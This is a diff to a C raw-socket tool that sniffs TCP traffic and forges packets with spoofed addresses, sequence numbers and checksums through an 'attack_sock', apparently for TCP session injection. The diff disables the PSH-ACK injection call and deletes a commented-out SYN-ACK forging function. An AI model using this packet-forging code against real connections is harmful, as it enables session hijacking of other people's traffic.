@@ -171,11 +171,12 @@ int main(int argc, char *argv[]) {
             // check for syn to the service
 
             if (iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
-            if ((tcph -> syn != 1) || (tcph -> ack != 1)) goto final; // only care about syn ack packets
-            if ((iph -> saddr != service_addr) && (tcph -> source != service_port)) goto final; // destination has to be the service
+            if ((tcph -> syn != 1) && (tcph -> ack != 1)) goto final; // only care about syn or ack packets
             print_tcp_packet(buf, num); // log the packet;
+
+            // if ((iph -> saddr != service_addr) && (tcph -> source != service_port)) goto final; // destination has to be the service
             // send_synack(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // syn ack
-            send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
+            // send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
             goto final;
         }
     }
@@ -232,54 +233,6 @@ uint16_t ip_checksum(void* vdata,size_t length) {
     // Return the checksum in network byte order.
     return htons(~acc);
 }
-
-// void send_synack(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
-//     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
-// {
-//     int num;
-//     struct sockaddr_in sa;
-
-//     size_t tcp_len = sizeof(struct tcphdr);
-//     struct iphdr *iph = (struct iphdr *) datagram;
-//     struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
-//     struct pshdr *psh = (struct pshdr *) pseudo_packet;
-//     struct tcphdr *cstcph = (struct tcphdr *) (psh + 1);
-
-//     // dynamic TCP fields
-//     tcph -> syn = 1;
-//     cstcph -> syn = 1;
-//     tcph -> source = sport; // source port
-//     cstcph -> source = sport;
-//     tcph -> dest = dport; // destination port
-//     cstcph -> dest = dport;
-//     tcph -> seq = htonl(seq0); // sequence number
-//     cstcph -> seq = htonl(seq0);
-//     tcph -> ack_seq = htonl(ack0); // ack sequence number
-//     cstcph -> ack_seq = htonl(ack0);
-
-//     // dynamic pseudo fields
-//     psh -> src_addr = saddr;
-//     psh -> dst_addr = daddr;
-
-//     tcph -> check = 0;
-//     cstcph -> check = 0;
-
-//     // calculate check sum
-//     tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
-
-//     // dynamic IP fields
-//     iph -> saddr = saddr;
-//     iph -> daddr = daddr;
-
-//     // dynamic sockaddr field
-//     sa.sin_family = AF_INET;
-//     sa.sin_addr.s_addr = daddr;
-
-//     if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-//     {
-//         perror("fakesync: sendto()\n");
-//     }
-// }
 
 void send_pshack(const size_t data_size, const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
